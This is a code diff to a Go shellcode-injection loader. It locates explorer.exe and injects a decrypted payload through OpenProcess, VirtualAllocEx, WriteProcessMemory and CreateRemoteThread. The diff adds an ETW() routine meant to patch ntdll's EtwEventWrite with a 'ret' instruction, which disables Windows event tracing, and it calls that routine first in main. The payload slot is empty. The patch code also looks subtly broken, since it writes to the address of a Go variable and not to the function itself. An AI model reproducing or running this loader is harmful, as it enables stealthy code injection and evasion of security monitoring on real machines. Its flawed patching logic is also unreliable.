@@ -29,20 +29,23 @@ type PROCESSENTRY32 struct {
 }
 
 var (
-    kernel32 = syscall.MustLoadDLL("kernel32.dll")
-    procCreateToolhelp32Snapshot = kernel32.MustFindProc("CreateToolhelp32Snapshot")
-    procProcess32First = kernel32.MustFindProc("Process32FirstW")
-    procProcess32Next = kernel32.MustFindProc("Process32NextW")
-    procCloseHandle = kernel32.MustFindProc("CloseHandle")
-    procLstrcmpi = kernel32.MustFindProc("lstrcmpiW")
-    openProcess = kernel32.MustFindProc("OpenProcess")
-    virtualAllocEx = kernel32.MustFindProc("VirtualAllocEx")
-    writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
-    createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
+    kernel32 = syscall.NewLazyDLL("kernel32.dll")
+    procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
+    procProcess32First = kernel32.NewProc("Process32FirstW")
+    procProcess32Next = kernel32.NewProc("Process32NextW")
+    procCloseHandle = kernel32.NewProc("CloseHandle")
+    procLstrcmpi = kernel32.NewProc("lstrcmpiW")
+    openProcess = kernel32.NewProc("OpenProcess")
+    virtualAllocEx = kernel32.NewProc("VirtualAllocEx")
+    writeProcessMemory = kernel32.NewProc("WriteProcessMemory")
+    createRemoteThread = kernel32.NewProc("CreateRemoteThread")
+    virtualProtect = kernel32.NewProc("VirtualProtect")
+    ntdll = syscall.NewLazyDLL("ntdll.dll")
+    etwEventWrite = ntdll.NewProc("EtwEventWrite")
 )
 
-
 func main() {
+	ETW()
 	log.SetFlags(0)
     pid := FindTarget("explorer.exe")
 
@@ -56,7 +59,7 @@ func main() {
 	
 	key := []byte("\x44\xe6\x89\xe7\xbf\xcd\x3e\xcb\x68\x85\x8e\xbc\xda\x61\xe7\xf7")
 	
-  //Insert the encrypted pyld
+        //Insert the encrypted pyld
 	sch := []byte("")
 
 	processID := (int(processId))
@@ -108,4 +111,37 @@ func FindTarget(procname string) uint32 {
     return pid
 }
 
+func ETW() {
+    patch := []byte{0xC3} // opcode for "ret" instruction
 
+    var oldProtect uint32
+    ret, _, err := virtualProtect.Call(
+        uintptr(unsafe.Pointer(&etwEventWrite)),
+        uintptr(len(patch)),
+        uintptr(syscall.PAGE_EXECUTE_READWRITE),
+        uintptr(unsafe.Pointer(&oldProtect)),
+    )
+
+    if ret == 0 {
+        fmt.Println("VirtualProtect failed:", err)
+        return
+    }
+
+    fmt.Printf("oldProtect: %x\n", oldProtect)
+
+    copy((*[1 << 30]byte)(unsafe.Pointer(&etwEventWrite))[:], patch)
+
+    ret, _, err = virtualProtect.Call(
+        uintptr(unsafe.Pointer(&etwEventWrite)),
+        uintptr(len(patch)),
+        uintptr(oldProtect),
+        uintptr(unsafe.Pointer(&oldProtect)),
+    )
+
+    if ret == 0 {
+        fmt.Println("VirtualProtect failed:", err)
+        return
+    }
+
+    fmt.Println("Patch applied successfully")
+}
